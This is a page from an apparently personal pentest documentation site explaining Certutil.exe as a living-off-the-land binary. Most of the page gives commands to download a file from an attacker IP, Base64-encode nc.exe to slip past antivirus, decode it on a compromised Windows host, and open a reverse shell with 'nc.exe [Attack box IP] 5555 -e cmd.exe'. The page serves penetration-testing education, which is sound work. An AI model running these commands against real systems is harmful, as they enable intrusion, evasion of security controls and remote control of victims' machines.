<!DOCTYPE html>
<html class="no-js" lang="fr">
<head>
    <meta charset="utf-8" />
        <meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="docsearch:name" content="Cyber Security" />
    <meta name="docsearch:package_type" content="" />
    <meta name="docsearch:release" content="" />
    <meta name="docsearch:version" content="" />
    
        <title>Certutil.exe &mdash; Documentation Cyber Security </title>
    
    <link rel="stylesheet" type="text/css" href="../../../_static/dist/fontawesome.css" />
      <link rel="stylesheet" type="text/css" href="../../../_static/dist/theme.css" />
      <link rel="stylesheet" type="text/css" href="../../../_static/graphviz.css" />
            <link rel="index" title="Index" href="../../../genindex.html" />
            <link rel="search" title="Recherche" href="../../../search.html" />
            <link rel="top" title="Documentation Cyber Security " href="#" />
            <link rel="up" title="Toolbox" href="../Toolbox.html" />
            <link rel="next" title="Gophish" href="../Gophish/Gophish.html" />
            <link rel="prev" title="BurpSuite" href="../BurpSuite/BurpSuite.html" />
    </head>
<body>
    <header class="container-fluid bg-primary">
        <div class="container-fluid">
            <div class="navbar navbar-expand-lg navbar-dark font-weight-bold">
                    <a href="../../../index.html"
                        title="logoGrenouilleTech"
                        class="logo navbar-brand"
                    >
                        <img src="../../../_static/img/ColorLogoOpenHardware-noBackground.svg" width="500" height="400" alt="logoGrenouilleTech"
                            class="logo-img"
                        />
                        Cyber Security
                    </a>
                
                
                <button class="navbar-toggler btn btn-primary d-lg-none" type="button" data-toggle="collapse" data-target="#collapseSidebar" aria-expanded="false" aria-controls="collapseExample">
                    <span class="navbar-toggler-icon"></span>
                    <span class="sr-only">Menu</span>
                </button>
            </div>
        </div>
    </header>
    <div class="container-fluid">
        <div class="row">
            <aside class="col-12 col-lg-3 sidebar-container">
                <div id="collapseSidebar" class="collapse sticky-top d-lg-block pt-5 pr-lg-4">
<div id="searchbox" style="display: none" role="search">
  <h3 id="searchlabel">Recherche rapide</h3>
    <div class="searchformwrapper">
    <form class="search" action="../../../search.html" method="get">
      <input type="text" name="q" aria-labelledby="searchlabel" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
      <input type="submit" value="Go" />
    </form>
    </div>
</div>
<script>document.getElementById('searchbox').style.display = "block"</script><div class="site-toc">
    <nav class="toc mt-3" aria-label="Main menu">
        <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="reference internal" href="../../CyberSec.html">Cyber Security</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../../Distrib/Distrib.html">Cyber Security Distribution</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../Distrib/Kali/Kali.html">Kali</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../Pentest/Pentest.html">The Pentest</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../Pentest/Scope/Scope.html">Objectives &amp; Scope</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Scope/blackGreyWhite/blackGreyWhite.html">Black, Grey &amp; White box penetration testing</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Scope/rules/rules.html">Rules of engagement &amp; Results</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../Pentest/Enumeration/Enumeration.html">Enumeration</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Enumeration/PassiveEnum/PassiveEnum.html">Passive information gathering</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Enumeration/ActiveEnum/ActiveEnum.html">Active information gathering</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../Pentest/Enumeration/ActiveEnum/NetEnum/NetEnum.html">Network Enumeration</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Enumeration/OSINT/OSINT.html">OSInt</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../Pentest/Vulnerability/Vulnerability.html">Vulnerability, identification and assesment</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../Pentest/Exploitation/Exploitation.html">Exploitation</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Exploitation/Exploit/Exploit.html">Exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Exploitation/TransfertExploit/TransfertExploit.html">Transferring the exploit to the target host</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Exploitation/BypassSec/BypassSec.html">Bypass Security</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Exploitation/PrivEsc/PrivEsc.html">Privilege Escalation</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Exploitation/PrivEsc/PrivEsc.html#weblinks">Weblinks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../Pentest/Exploitation/PostExploit/PostExploit.html">Post Exploitation</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../webSecurity/webSecurity.html">Web Security</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../webSecurity/bugBountyVDS/bugBountyVDS.html">Bug Bounty &amp; Vulnerability Disclosur Program (VDS)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../webSecurity/webSecurityAcademy/webSecurityAcademy.html">Web Security Academy</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/serverSideVulnerabilities.html">Server-Side Vulnerabilities</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/pathTraversal/pathTraversal.html">Path Traversal</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/accessControl/accessControl.html">Access Control</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2 current"><a class="reference internal" href="../Toolbox.html">Toolbox</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="../BurpSuite/BurpSuite.html">BurpSuite</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3 current"><a class="current reference internal" href="#">Certutil.exe</a></li>
<li class="toctree-l3"><a class="reference internal" href="../Gophish/Gophish.html">Gophish</a></li>
<li class="toctree-l3"><a class="reference internal" href="../Netcat/Netcat.html">Netcat</a></li>
<li class="toctree-l3"><a class="reference internal" href="../OsintTools/OsintTools.html">OSInt Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../Owasp_ZAP/Owasp_ZAP.html">Owasp ZAP</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../RTTool/RTTool.html">Red Team Tools</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../RTTool/Metasploit/Metasploit.html">Metasploit</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Metasploit/Meterpreter/Meterpreter.html">Meterpreter</a></li>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Metasploit/Msfvenom/Msfvenom.html">Msfvenom</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../RTTool/Nmap/Nmap.html">Nmap</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Nmap/hostDiscovery/hostDiscovery.html">Host Discovery</a></li>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Nmap/nmapPortScan/nmapPortScan.html">Nmap Port Scanning Techniques</a></li>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Nmap/Fingerprint/Fingerprint.html">Fingerprinting services and operating systems</a></li>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Nmap/NmapScripEngine/NmapScripEngine.html">Namp Script Engine (NSE)</a></li>
<li class="toctree-l5"><a class="reference internal" href="../RTTool/Nmap/outputData/outputData.html">Output Data to files</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../wget/wget.html">wget</a></li>
</ul>
</li>
</ul>
</li>
</ul>

    </nav>
    <template data-toggle-item-template>
        <button class="btn btn-sm btn-link toctree-expand" type="button">
            <span class="sr-only">Toggle menu contents</span>
        </button>
    </template>
</div>
                    <div class="d-lg-none border-bottom">
                        
                    </div>
                </div>
            </aside>
            <div class="col-12 col-lg-9 pt-5">
                <header class="row align-items-baseline">
                    <div class="col">
                        <nav aria-label="breadcrumb">
    <ol class="breadcrumb m-0 p-0 bg-transparent">
        <li class="breadcrumb-item"><a href="../../../index.html">Docs</a></li>
            <li class="breadcrumb-item"><a href="../../CyberSec.html">Cyber Security</a></li>
            <li class="breadcrumb-item"><a href="../Toolbox.html">Toolbox</a></li>
        <li class="breadcrumb-item active" aria-current="page">Certutil.exe</li>
    </ol>
</nav>
                    </div>
                    <div class="col-sm-12 col-lg-auto mt-3 mt-lg-3">
                        <noscript>
                            <p>JavaScript is required to toggle light/dark mode..</p>
                        </noscript>
                        <button id="ahd-theme" class="btn btn-sm btn-light text-decoration-none" type="button">
                            <span class="dark-only"><i class="fas fa-sun"></i> Light mode</span>
                            <span class="light-only"><i class="fas fa-moon"></i> Dark mode</span>
                        </button>
    <a class="btn btn-sm btn-light text-decoration-none" href="https://github.com/ahdcreative/sphinx_ahd_theme/blob/main/docs/CyberSec/Toolbox/Certutil/Certutil.rst" rel="nofollow">
        <span class="btn-icon"><span class="fab fa-github"></span></span>
        <span class="btn-text">Edit on GitHub</span>
    </a>
    <a class="btn btn-sm btn-light text-decoration-none" href="../../../_sources/CyberSec/Toolbox/Certutil/Certutil.rst.txt" rel="nofollow">
        <span class="btn-icon"><span class="fas fa-code"></span></span>
        <span class="btn-text">View source</span>
    </a>
                        
                    </div>
                </header>
                <div class="row" >
                    <div class="col-12">
                        <hr class="w-100 my-4">
                    </div>
                </div>
                <div class="row">
                    <div class="col-12 col-lg-9 order-last order-lg-first rst-content">
                        <main role="main">
<section id="certutil-exe">
<span id="ref-certutil"></span><h1><a class="toc-backref" href="#sommaire" role="doc-backlink">Certutil.exe</a><a class="headerlink" href="#certutil-exe" title="Lien permanent vers cette rubrique">¶</a></h1>
<nav class="contents" id="sommaire">
<span id="index-0"></span><p class="topic-title">Sommaire</p>
<ul class="simple">
<li><p><a class="reference internal" href="#certutil-exe" id="id1">Certutil.exe</a></p>
<ul>
<li><p><a class="reference internal" href="#certutil" id="id2">Certutil</a></p></li>
<li><p><a class="reference internal" href="#base64-encoded-payloads" id="id3">Base64-encoded payloads</a></p></li>
<li><p><a class="reference internal" href="#weblinks" id="id4">Weblinks</a></p></li>
</ul>
</li>
</ul>
</nav>
<hr class="docutils" />
<section id="certutil">
<h2><a class="toc-backref" href="#sommaire" role="doc-backlink">Certutil</a><a class="headerlink" href="#certutil" title="Lien permanent vers cette rubrique">¶</a></h2>
<p>CertUtil.exe is installed as part of Certificate Services and can be used to manage
certificates in Windows.</p>
<p>With certutil you can perform various function related to certificates and certificate stores,
such as displaying certification authority (CA) configuration information, configure
Certificate Services, backup and restore CA components, and verify certificates, key pairs,
and certificate chains.</p>
<blockquote>
<div><div class="admonition important">
<p class="admonition-title">Important</p>
<p>Certutil is also known as a Living Off Land (LOL) binary which is a trusted,
pre-installed system tool with ‘extra’ unexpected functionality, such as downloading
files. An interesting feature of certutil is the option to download a remote
certificate from a remote URL and save it to the local file system. While this feature
is intended to download certificate files, <strong>it can also be used to download
non-certificate files with one simple command, including scripts and executables</strong>.</p>
</div>
</div></blockquote>
<p>It should not come as a surprise that this feature is heavily utilized in campaigns to
download malware which <strong>can even bypass security programs and monitoring by base64 encoding
the malicious file and decoding it after it has been downloaded to the system</strong>.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Transferring file with certutil.exe</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w">    </span>certutil<span class="w"> </span>-urlcache<span class="w"> </span>-split<span class="w"> </span>-f<span class="w"> </span><span class="o">[</span>URL<span class="o">]</span><span class="w"> </span><span class="o">[</span>Filename.Extension<span class="o">]</span>
</pre></div>
</div>
<p><strong>Options explained</strong></p>
<blockquote>
<div><ul class="simple">
<li><p>-URLcache: Displays or deletes URL cache entries.</p></li>
<li><p>-f: Forces fetching a specific URL and updating the cache.</p></li>
<li><p>-split: Split embedded ASN.1 elements, and save to files on disk.</p></li>
</ul>
</div></blockquote>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>exemple</strong></p>
<p>an example where we download a file called nc.exe</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w">    </span>certutil<span class="w"> </span>-urlcache<span class="w"> </span>-split<span class="w"> </span>-f<span class="w"> </span>http://<span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>nc.exe
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../_images/certutil1.jpg"><img alt="../../../_images/certutil1.jpg" class="align-center" src="../../../_images/certutil1.jpg" style="width: 500px;" /></a>
<p>The certutil program confirms that the command completed successfully.</p>
</div>
</section>
<hr class="docutils" />
<section id="base64-encoded-payloads">
<h2><a class="toc-backref" href="#sommaire" role="doc-backlink">Base64-encoded payloads</a><a class="headerlink" href="#base64-encoded-payloads" title="Lien permanent vers cette rubrique">¶</a></h2>
<p>Another nice feature of CertUtil.exe that may <strong>help to bypass security controls</strong> is the option to
decode Base64-encoded files to the file system.</p>
<p>Using the <strong>-decode</strong> option, we can download a Base64-encoded malicious executable as text file and
decode the executable to disk. This may help in effectively bypassing security controls such as
antivirus, edge devices and filtering.</p>
<p>Let us demonstrate this with an example where we have a Base64-encoded text file of the nc.exe
executable, transfer it to the compromised Windows host, decode it back to an executable and finally
execute it for a reverse shell.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The following figure is a diagram of the process:</p>
<a class="reference internal image-reference" href="../../../_images/Base64-encoded-payloads-WM.jpg"><img alt="../../../_images/Base64-encoded-payloads-WM.jpg" class="align-center" src="../../../_images/Base64-encoded-payloads-WM.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>First, we need to Base64-encode the Netcat executable. The command to Base64-encode files with
CertUtil.exe.</p>
<blockquote>
<div><ol class="arabic">
<li><p>Encode the payload to Base64</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w">  </span>certutil.exe<span class="w"> </span>-encode<span class="w"> </span><span class="o">[</span>inputFileName<span class="o">]</span><span class="w"> </span><span class="o">[</span>encodedOutputFileName<span class="o">]</span>
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../_images/certutil_base64encoding_01.jpg"><img alt="../../../_images/certutil_base64encoding_01.jpg" class="align-center" src="../../../_images/certutil_base64encoding_01.jpg" style="width: 500px;" /></a>
</div>
<p>The output of this command is a text file that contains the Base64-encoded nc.exe binary.
This text file can be transferred to the comprised target where it will be decoded back to a
binary on disk.</p>
<p>To verify that the nc.txt file contains text, we can run the following command to print the
first 10 lines to the terminal:</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Title</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>powershell<span class="w"> </span>-command<span class="w"> </span><span class="s2">&quot;Get-Content nc.txt -Head 10&quot;</span>
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../_images/certutil_base64encoding_02.jpg"><img alt="../../../_images/certutil_base64encoding_02.jpg" class="align-center" src="../../../_images/certutil_base64encoding_02.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
</div></blockquote>
</li>
<li><p>Transfert the file to the target</p>
<blockquote>
<div><p>The next step is to transfer the text file to the target and decode it back to an executable.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
</div>
</div></blockquote>
</li>
<li><p>Decode the Base64 file from the compromise target</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>certutil.exe<span class="w"> </span>-decode<span class="w"> </span>nc.txt<span class="w"> </span>nc.exe
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../_images/certutil_base64encoding_04.jpg"><img alt="../../../_images/certutil_base64encoding_04.jpg" class="align-center" src="../../../_images/certutil_base64encoding_04.jpg" style="width: 500px;" /></a>
</div>
<p>As we can see on the screenshots, the nc.txt file was successfully downloaded to the target
host and decoded to disk with the last command.</p>
</div></blockquote>
</li>
<li><p>Exploit or virifying Netcat is working</p>
<blockquote>
<div><p>To verify that we got a working version of Netcat, we can execute this binary to connect
back to our attack box.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Execute the following command on the Windows compromised host to initiate the reverse
shell to the attack box and connect the cmd.exe program to the shell:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>nc.exe<span class="w"> </span><span class="o">[</span>Attack<span class="w"> </span>box<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span><span class="m">5555</span><span class="w"> </span>-e<span class="w"> </span>cmd.exe
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../_images/certutil_base64encoding_05.jpg"><img alt="../../../_images/certutil_base64encoding_05.jpg" class="align-center" src="../../../_images/certutil_base64encoding_05.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
</li>
</ol>
</div></blockquote>
</section>
<hr class="docutils" />
<section id="weblinks">
<h2><a class="toc-backref" href="#sommaire" role="doc-backlink">Weblinks</a><a class="headerlink" href="#weblinks" title="Lien permanent vers cette rubrique">¶</a></h2>
</section>
</section>

</main>
                        <nav aria-label="Page navigation" class="py-4 my-5 clearfix font-weight-bold border-top">
    <a class="float-left" href="../BurpSuite/BurpSuite.html" title="Previous">
        <span aria-hidden="true">←&nbsp;</span>BurpSuite
    </a>
    <a class="float-right" href="../Gophish/Gophish.html" title="Next">
        Gophish <span aria-hidden="true">&nbsp;→</span>
    </a>
</nav>
                    </div>
                    
                    <nav class="col-12 col-lg-3 pb-4">
                        <div class="sticky-top toc page-toc" aria-labelledby="page-toc-heading">
                            <p class="font-weight-bold" id="page-toc-heading">Page contents</p>
                            <ul>
<li><a class="reference internal" href="#">Certutil.exe</a><ul>
<li><a class="reference internal" href="#certutil">Certutil</a></li>
<li><a class="reference internal" href="#base64-encoded-payloads">Base64-encoded payloads</a></li>
<li><a class="reference internal" href="#weblinks">Weblinks</a></li>
</ul>
</li>
</ul>

                        </div>
                    </nav>
                    
                </div>
            </div>
        </div>
    </div>
    <footer class="container-fluid bg-primary text-light">
        <div class="container">
            <div class="row">
        <div class="col p-4">
            
            <div class="text-center">
                <p style="display: none">
                    <a class="text-light" href="https://github.com/ahdcreative/sphinx_ahd_theme" rel="nofollow" target="_blank">
                        AHDCreative Sphinx Theme 5.3.8
                    </a>
                </p>
            </div>
            <div class="text-center">
                    &copy; Copyright 2023, Poltergeist42
            </div>
        </div>
    </div>
        </div>
    </footer>
        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js"></script>
        <script src="../../../_static/jquery.js"></script>
        <script src="../../../_static/underscore.js"></script>
        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="../../../_static/doctools.js"></script>
        <script src="../../../_static/sphinx_highlight.js"></script>
        <script src="../../../_static/translations.js"></script>
        <script type="text/javascript" src="../../../_static/dist/theme.js"></script>
        <script type="text/javascript" src="../../../_static/dist/vendor.js"></script>
        <script type="text/javascript" src="../../../_static/searchtools.js"></script>
        <script type="text/javascript" src="../../../_static/language_data.js"></script>
        <script type="text/javascript">
            jQuery(function() { Search.loadIndex("../../../searchindex.js"); });
        </script>
        <script type="text/javascript" id="searchindexloader"></script>
    </body>
</html>